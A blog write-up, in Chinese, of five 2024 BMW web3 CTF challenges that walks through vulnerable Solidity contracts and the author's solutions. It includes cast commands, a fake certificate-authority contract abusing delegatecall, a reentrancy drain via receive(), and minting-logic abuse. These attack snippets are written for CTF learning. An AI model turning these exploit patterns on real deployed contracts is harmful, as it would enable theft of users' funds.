
2024 BMW web3 CTF 部分 writeups

- - -

## 2024 BMW web3 CTF 部分 writeups

### Background

参加了下比赛做了一下，质量较好，比较适合我这种 Web3 新手，正好复习了很多以前忘的知识

### easy-warmup

```plain
//SPDX-License-Identifier: MIT
pragma solidity >= 0.7.0 < 0.9.0;

contract Warmup {
    string public flag = "flag{FAKE_FLAG}";

    function Callme() public view returns(string memory) {
        return flag;
    }
}
```

签到题很简单，要求你读取 flag 变量或者直接调用 Callme（）函数即可 没什么好说的，但是我推荐一款工具 cast

可以对账户执行相关的交易，在实际调试和 web3 相关 CTF 中很好用

```plain
cast call --rpc-url sepolia_rpc address "Callme()(string)"
```

最后 flag flag{W31com3\_T0\_6lockcha1n\_W0r1d}

### easy-Over 16

又是一道基础题

```plain
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Over_16 {
    mapping(address => uint16) public balances;
    uint16 private originalBalance;

    constructor() public {
        originalBalance = 21436;
        balances[msg.sender] = originalBalance;
    }

    function add_16(uint _value) public {
        balances[msg.sender] += uint16(_value);
    }

    function get16_Flag() public returns (string memory) {
        require(balances[msg.sender] == 16, "XXXXXXXXXXXXXXXX");
        balances[msg.sender] = originalBalance;
        return "flag{FAKE_FLAG}";
    }

    function getBalance() public view returns (uint16) {
        return balances[msg.sender];
    }
}
```

可以看到 get16\_F1ag() 的要求是要求余额为 16

```plain
cast send --rpc-url sepolia_rpc --private-key KEY 0xxxx "add_16(uint)" "16"
cast call --rpc-url sepolia_rpc --private-key KEY 0xxxx "get16_Flag()(string)"
```

给函数穿参数然后再调用即可

flag{0H\_y0u\_0v3r\_F7F7L!L!0Oo0WzWz\_m3!}

### Meidum-Access Control

```plain
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControll{
    address public owner;

    CertificateAuthority CA;
    mapping(address => bool) grantedUsers;
    mapping(address => uint256) public securityLevel;

    constructor ( address _owner) {
        owner = _owner;
    }

    function accessRequest(address payable  _CA)public {
        CA = CertificateAuthority(_CA);
        bool success = CA.verify(msg.sender);
        if(success) grantedUsers[msg.sender] = true;

    }

    function setSecurityLevel( address user, uint256 level)public payable  {
        require(grantedUsers[user] == true, "You need Permission to raise the security level!!");
        (bool success, bytes memory result) = address(CA).delegatecall(abi.encodeWithSignature("setLevel(address,address,uint256)",owner,  user,level));
        require(success, "Delegatecall failed");
        uint256 levelToSet;
        assembly {
            levelToSet := mload(add(result, 0x20))
        }

        securityLevel[user] = levelToSet;
    }

    function flag()public view returns (string memory){
        require(grantedUsers[msg.sender] == true, "You need Permission to get the flag!");
        require(securityLevel[msg.sender] == 5, "Your level must be 5 to get the flag!");
        return "flag{FAKE_FLAG}";
    }

    receive() external payable  {

    }

}

contract CertificateAuthority{
    mapping(address => bool) grantedUsers;

    constructor() {   }

    function verify(address user) public payable  returns (bool){
        if(msg.value > 1000000000000000000000 ){
            grantedUsers[user] = true;
            return true;
        }
        else if (grantedUsers[user] == true){ 
            return true;
        }
        return false;
    }

    function setLevel(address owner, address toSet, uint256 level)public returns(uint256){
        require(msg.sender == owner);
        require(grantedUsers[toSet] == true);

            level = level << 3;
            level = level ^ 0xD9;
            level = level & 0x03;

        return level;
    }

     receive() external payable { 

        require(msg.value > 1000000000000000000000);

     }
}
```

代码看着是比较长的，但我们直接回溯核心的拿到 flag 的条件

```plain
function flag()public view returns (string memory){
        require(grantedUsers[msg.sender] == true, "You need Permission to get the flag!");
        require(securityLevel[msg.sender] == 5, "Your level must be 5 to get the flag!");
        return "flag{FAKE_FLAG}";
    }
```

要求函数调用者必须授权，而且等级为 5

我们先来看看鉴权的过程 accessRequest() 中，使用接收到的地址来加载合约，`verify()`调用该合约的函数，如果该函数的返回值为 true，则设置权限

```plain
function accessRequest(address payable  _CA)public {
        CA = CertificateAuthority(_CA);
        bool success = CA.verify(msg.sender);
        if(success) grantedUsers[msg.sender] = true;

    }
```

然后在 securtityLevel 这里设置安全级别，使用 accessRequest 的函数调用外部合约，最后级别是根据函数的返回值进行计算的

```plain
function setSecurityLevel( address user, uint256 level)public payable  {
        require(grantedUsers[user] == true, "You need Permission to raise the security level!!");
        (bool success, bytes memory result) = address(CA).delegatecall(abi.encodeWithSignature("setLevel(address,address,uint256)",owner,  user,level));
        require(success, "Delegatecall failed");
        uint256 levelToSet;
        assembly {
            levelToSet := mload(add(result, 0x20))
        }
```

可以看到漏洞的核心点就在于我们接受的地址来加载合约，也就是可控 可以自己编写代码

编写一个自己的 CA

```plain
contract CA {
    constructor() {}

    function verify(address user) public payable returns (bool) {
        return true;
    }

    function setLevel(
        address owner,
        address toSet,
        uint256 level
    ) public returns (uint256) {
        return 5;
    }
}
```

然后再编写一个自己的攻击合约来进行调用，调用链如下

```plain
attack.accessRequest(payable(address(ca))); 
 attack.setSecurityLevel(address(this), 0);
 attack.flag();
```

我在做这道题的时候踩了个坑，我当时仔细阅读了代码

```plain
levelToSet := mload(add(result, 0x20))
```

我注意到使用了 mload 函数，进行相关搜索的介绍

mload() 函数在汇编代码中使用，从特定内存地址读取字（32 字节）数据并将其分配给变量或用于计算。

如果 abi.encode(uint(5)); 这么来设置为 5，打印结果的数据很奇怪，是以 uint 形式返回 5

看起来 delegatecall() 调用特定函数时，如果该函数返回字节类型，会包含用于附加信息的字节

### Medium-Mamma Mia!

```plain
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MammaMia {
    mapping(address => uint) public balances;
    address public flagCapturer;
    mapping(address => bool) public flagResetters;

    function deposit() public payable {
        require(msg.value > 0, "Deposit must be greater than zero");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(!flagResetters[msg.sender], "The flag resetter is not allowed to withdraw");
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance to withdraw");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function captureFlag() public {
        require(address(this).balance == 0, "Contract balance is not zero");
        require(flagCapturer == address(0), "Flag has already been captured");

        flagCapturer = msg.sender;
    }

    function resetFlag() public payable {
        require(flagCapturer == msg.sender, "You are not the flag capturer");
        require(msg.value >= 0.001 ether, "Please add balance to the contract for someone else");

        flagResetters[msg.sender] = true;
        flagCapturer = address(0);
    }

    function getFlag() public view returns (string memory) {
        require(flagResetters[msg.sender], "You are not the flag resetter");

        return "flag{FAKE_FLAG}";
    }
}
```

可以看到要求 flagResetters 必须为 true，而这个值是在 resetFlag 函数进行设置

```plain
function resetFlag() public payable {
        require(flagCapturer == msg.sender, "You are not the flag capturer");
        require(msg.value >= 0.001 ether, "Please add balance to the contract for someone else");

        flagResetters[msg.sender] = true;
        flagCapturer = address(0);
    }
```

可以看到这个函数的要求

1.flagCapturer 为当前用户

2.msg.value>=0.01 ether

flagCapture 可以在 captureFlag() 函数

```plain
function captureFlag() public {
        require(address(this).balance == 0, "Contract balance is not zero");
        require(flagCapturer == address(0), "Flag has already been captured");

        flagCapturer = msg.sender;
    }
```

但是注意要使用函数必须要没钱，这里可以看到，当 withdraw() 查看函数的时候 msg.sender.call 会出现重入漏洞

向该函数汇款后余额被设置为 0

利用 Poc 如下

```plain
function attack1() public payable {
        m.deposit{value: 0.001 ether}();
    }

    function attack2() public {
        m.withdraw();
    }

    function attack3() public {
        m.captureFlag();
    }

    function attack4() public payable {
        m.resetFlag{value: 0.001 ether}();
    }

    function attack5() public {
        flag = m.getFlag();
    }

    function getFlag() public view returns (string memory) {
        return flag;
    }

    receive() external payable {
        if (m.getBalance() != 0) {
            m.withdraw();
        }
    }
```

### Hard-Safe Deposit Box

一道非常顶的题目

```plain
pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
contract SafeDepositBox {

    address owner;
    constructor () {
        owner = msg.sender;
        balances[owner] = 2147483647;
    }
    struct Transaction {
        address to;
        address from;
        uint amount;

    }
    uint private state_num = 0;
    mapping(uint => Transaction[]) public userTransactions;
    mapping(address => uint) public balances;   

    string private secret_password = unicode"REDACTED";

    modifier fill_money() {
        if (balances[owner] < 10000) {
            balances[owner] = 2147483647;
        }
        _;
    }
    function make_account() public returns (address){
        balances[msg.sender] = 1000;
        return msg.sender;
    }

    function introduction_safe_deposit_box() public pure returns (string memory) {
        return "This is a safe asset management service. We haven't been hacked in the last 10 years.";
    }

    function safe_remittance_function(string memory password, address _to,uint _amount) external returns (uint){
        require(keccak256(abi.encodePacked(password)) == keccak256(abi.encodePacked(secret_password)), "Incorrect password");
        require(balances[msg.sender] >= _amount);
        address _from = msg.sender;
        balances[_from] -= _amount;
        balances[_to] += _amount;
        Transaction memory newTransaction = Transaction({
            to: _to,
            from: _from,
            amount: _amount
        });
        uint hash = uint(keccak256(abi.encodePacked(block.timestamp)));
        userTransactions[hash].push(newTransaction);
        return hash;
    }

    function cancel_transaction(uint _hash) public fill_money{
        require(userTransactions[_hash].length > 0, "No transaction with this hash");
        Transaction storage transactionToCancel = userTransactions[_hash][0];
        require(transactionToCancel.from == msg.sender, "You are not the sender of this transaction");
        balances[transactionToCancel.from] += transactionToCancel.amount;
        balances[transactionToCancel.to] -= transactionToCancel.amount;
    }

    function buy_flag() public returns (string memory) {
        require (balances[msg.sender] > 100000, "Not Enough money.");
        require (msg.sender != owner,"No Hack.");
        balances[msg.sender] = 0;
        string memory flag = return_flag();
        return flag;
    }

    function return_flag() internal returns (string memory) {
        return unicode"flag{REDACTED}";
    }
}
```

获取 flag 要求 balances\[msg.sender\] > 100000，而在 makecount 里，余额会初始化 1000

```plain
function make_account() public returns (address){
        balances[msg.sender] = 1000;
        return msg.sender;
    }
```

safe\_remittance\_function() 函数会随机发给随机用户，所以随机用户的钱就是 1000，我们就没钱了 思路就比较清晰

1.因为 make\_account() 没有限制，就可以一直调用

2.等攒够钱了 使用 cancel\_transaction() 取消交易，就可以拿到 flag 了

```plain
function safe_remittance_function(string memory password, address _to,uint _amount) external returns (uint){
        require(keccak256(abi.encodePacked(password)) == keccak256(abi.encodePacked(secret_password)), "Incorrect password");
        require(balances[msg.sender] >= _amount);
        address _from = msg.sender;
        balances[_from] -= _amount;
        balances[_to] += _amount;
        Transaction memory newTransaction = Transaction({
            to: _to,
            from: _from,
            amount: _amount
        });
        uint hash = uint(keccak256(abi.encodePacked(block.timestamp)));
        userTransactions[hash].push(newTransaction);
        return hash;
    }
```

但是调用 safe\_remittance\_function 这个函数需要密码，可以直接在[https://etherscan.io/找](https://etherscan.io/%E6%89%BE)

### Hard-BMW Bugbounty

是我觉得最好玩的一道题

提供了两个文件 一个是

```plain
NFT.sol
//SPDX-License-Identifier : MIT
pragma solidity ^0.8.0;

import "./process.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract BMW {
    address private owner;
    BMW_process private processContract;

    constructor () {
        processContract = new BMW_process(address(this));
        owner = msg.sender;
    }

    modifier OnlyOwner {
        require(msg.sender == owner, "Your not owner");
        _;
    }

    function change_owner(address _owner) external OnlyOwner{
        owner = _owner;
    }

    function search_address() external view returns(address) {
        return address(processContract);
    }


    function flag() external returns(string memory){
        require(processContract.check_my_nft(msg.sender) > 10000, "Enough BMW NFT");

        processContract.reset_account();

        return "Exploit-Success!!";
    }

}
```

但这里使用了 ERC20 看到获得 flag 的条件 NFT > 10000

另一个文件如下

```plain
/SPDX-License-Identifier : MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BMW_process is ERC20{
    address private guardian;
    mapping (address => mapping (address => uint256)) private _allowance;
    mapping (address => uint256) private balance;

    constructor (address _guardian) ERC20("BMW_NFT", "BMW") {
        _mint(msg.sender, 1000);
        guardian = _guardian;
    }

    modifier OnlyGuardian {
        require(msg.sender == guardian, "Your not guardian");
        _;
    }

    function change_guardian(address _guardian) public OnlyGuardian {
        guardian = _guardian;
    }

    function mint() public {
        _mint(msg.sender, 10);
        balance[msg.sender] = balanceOf(msg.sender);
    }

    function Buy_nft(uint256 _count) external payable returns(uint256) {
        for(uint256 i; i < _count; i++) {
            require(msg.value >= 1 ether, "Not enough Ether");
            balance[msg.sender] = balanceOf(msg.sender);
            _mint(msg.sender, balance[msg.sender] + 1);

            if (balance[msg.sender] > 10000) {

                return balance[msg.sender];
            }
        }

        return balance[msg.sender];
    }

    function nfttransfer(address _receipt, uint256 _amount) external returns(bool) {
        require(balance[msg.sender] > _amount, "Not enough BMW NFT");
        require(_allowance[msg.sender][_receipt] > _amount, "Not enough allowance");
        require(balance[msg.sender] > balance[msg.sender] - _amount, "Detected integer underflow");
        require(_allowance[msg.sender][_receipt] < _allowance[msg.sender][_receipt] + _amount, "Detected integer overflow");

        super._transfer(msg.sender, _receipt, _amount);

        return true;
    }

    function get_allowance(address _from, address _to, uint256 _amount) external OnlyGuardian returns(bool) {
        require(_allowance[_from][_to] < _allowance[_from][_to] + _amount, "detected integer overflow");
        _allowance[_from][_to] += _amount;
    }

    function check_my_nft(address _target) public view returns(uint256) {
        return balance[_target];
    }

    function check_allowance(address _from, address _to) public view returns(uint256) {
        return _allowance[_from][_to];
    }

    function reset_account() external OnlyGuardian {
        _mint(msg.sender, 0);
    }
}
```

通读代码的时候，我就觉得这个购买函数比较奇怪，因为他好像并没有扣我的钱去买 NFT

```plain
function Buy_nft(uint256 _count) external payable returns(uint256) {
        for(uint256 i; i < _count; i++) {
            require(msg.value >= 1 ether, "Not enough Ether");
            balance[msg.sender] = balanceOf(msg.sender);
            _mint(msg.sender, balance[msg.sender] + 1);

            if (balance[msg.sender] > 10000) {

                return balance[msg.sender];
            }
        }

        return balance[msg.sender];
    }
```

msg.value 大于 1 的时候 这个 NFT 就会无限增加，但是如果 for 循环代币，当余额大于 10000 他会终止

所以我们的思路是传一个大整数作为 \_count 获取 10000 的代币

攻击合约代码大概如下

```plain
function attack1() public payable {
        b.Buy_nft{value: 1 ether}(10001);
        flag = bmw.flag();
    }

    function attack2() public view returns(string memory) {
        return flag;
    }
```
